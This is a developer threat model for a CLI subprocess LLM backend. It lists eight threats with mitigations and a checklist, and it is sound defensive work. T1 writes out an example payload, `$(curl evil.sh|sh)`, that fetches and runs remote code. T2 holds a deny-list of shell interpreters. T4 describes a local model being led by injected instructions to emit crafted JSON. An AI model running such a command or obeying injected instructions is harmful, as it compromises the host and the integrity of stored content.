# Cycle 21 — Threat Model: CLI Subprocess Backend

**Date:** 2026-04-21
**Dep-CVE Baseline:** 0 Dependabot alerts (zero open on main). `pip-audit` unavailable
(pre-existing requirements.txt conflict unrelated to this cycle).

---

## T1 — Command injection via prompt content
**ASSET:** Host shell / developer workstation.
**ATTACK:** Attacker embeds `$(curl evil.sh|sh)` in `raw/` source; if `shell=True` or prompt
is interpolated into argv, it executes.
**MITIGATION:**
- Hard `shell=False` on every `subprocess.run`.
- Prompt via stdin only (`input=prompt.encode("utf-8")`), never argv.
- `{model}` placeholder validated `^[A-Za-z0-9._:/-]+$` before substitution.
- Gemini `-p` carve-out passes prompt as its own argv element (no shell joining).
- Unit test: prompt with `;`, `$(...)`, backticks, NUL chars round-trips via stdin unchanged.

## T2 — CLI_TOOL_COMMANDS misconfiguration / supply-chain swap
**ASSET:** Process execution boundary.
**ATTACK:** `CLI_TOOL_COMMANDS` env-overridden or PATH poisoned with `python -c ...` or CWD
binary.
**MITIGATION:**
- `CLI_TOOL_COMMANDS` is a frozen module constant — no env merge, no JSON load.
- argv[0] explicit deny-list: `python`, `sh`, `bash`, `cmd`, `powershell`, `pwsh`.
- `shutil.which` resolution; reject if resolved path is in CWD or world-writable dir.

## T3 — Secret leakage via stdout/stderr capture
**ASSET:** API keys, OAuth tokens.
**ATTACK:** CLI echoes "Authenticated with token Y..." into stdout; KB persists it into wiki.
**MITIGATION:**
- Subprocess gets a scrubbed env (allowlist: PATH, HOME, USERPROFILE, TEMP, TMPDIR, LANG,
  plus backend-specific token var only).
- Before returning stdout, run `_redact_secrets` (existing redaction in `kb.utils.llm`).
- Stderr never returned to caller; log at DEBUG only (also scrubbed). Never in exception msg.

## T4 — JSON extraction as prompt-injection amplifier
**ASSET:** Ingest extraction contracts, wiki page content.
**ATTACK:** Local model follows injected instructions and emits crafted JSON that passes schema
but carries payload into page titles/wikilinks.
**MITIGATION:**
- Strict `jsonschema` with `additionalProperties: false`.
- No heuristic "find first `{`"; accept whole-output-is-JSON or single fenced block only.
- Same title/slug sanitiser as Anthropic path — routing must not relax invariants.

## T5 — Timeout and resource exhaustion
**ASSET:** FastMCP server availability, memory, disk.
**ATTACK:** Ollama loads a 70B model and hangs; Gemini waits on interactive auth; stdout
streams gigabytes.
**MITIGATION:**
- Hard `timeout` kwarg (default 120s, env-clampable to 600s max, never unbounded).
- `MAX_CLI_STDOUT_BYTES = 2_000_000`; bounded read; kill on overflow.
- `stdin.close()` always to prevent interactive-prompt hangs.
- On `TimeoutExpired`: `proc.kill()` then `proc.wait(5)` then raise `LLMError(kind="timeout")`.
- No retries on timeout (unlike API rate-limit retries).

## T6 — Concurrency under FastMCP
**ASSET:** MCP server stability, concurrent ingest correctness.
**ATTACK:** Two parallel `kb_ingest` calls spawn concurrent subprocesses → VRAM OOM, auth
file races.
**MITIGATION:**
- Per-backend `threading.Semaphore` with `CLI_MAX_CONCURRENCY` (default 1 for GPU-bound
  backends like Ollama, 2 for API-proxy CLIs).
- Each call gets its own `stdin` pipe — no shared fds.

## T7 — `KB_LLM_BACKEND` env var validation
**ASSET:** Routing correctness.
**ATTACK:** `KB_LLM_BACKEND=anthrop1c` (typo) → `KeyError` mid-ingest; raw env value echoed
into error message.
**MITIGATION:**
- Validate against `ALLOWED_BACKENDS = frozenset({"anthropic", *CLI_TOOL_COMMANDS.keys()})`.
- 32-char cap; unknown value → `ValueError` WITHOUT echoing raw value.

## T8 — Argv/env exposure via process listing
**ASSET:** Prompt confidentiality.
**ATTACK:** `gemini -p <prompt>` puts full prompt in `ps` output; a co-tenant reads it.
**MITIGATION:**
- Prefer stdin universally; `-p` flag documented as weaker security posture.
- Pre-exec assertion: argv elements checked for token-shaped strings (`sk-*`, `Bearer *`,
  `ghp_*`) — fail-closed.
- No API keys ever on argv.

---

## Step 11 Checklist

- [ ] T1: `shell=False`; stdin-only for prompt; `{model}` regex-validated; shell-metachar test
- [ ] T2: `CLI_TOOL_COMMANDS` frozen constant; argv[0] deny-list; `shutil.which` absolute-path
- [ ] T3: Scrubbed subprocess env; stdout `_redact_secrets` before return; stderr never in msg
- [ ] T4: Strict `jsonschema`; whole-output-or-fenced only; same sanitiser as Anthropic path
- [ ] T5: `timeout` mandatory + clamped; `MAX_CLI_STDOUT_BYTES` cap; `stdin.close()`; no retry
- [ ] T6: Per-backend `threading.Semaphore`; no shared fds
- [ ] T7: `ALLOWED_BACKENDS` frozenset; no raw env echo in error
- [ ] T8: No secrets on argv; pre-exec token-pattern check
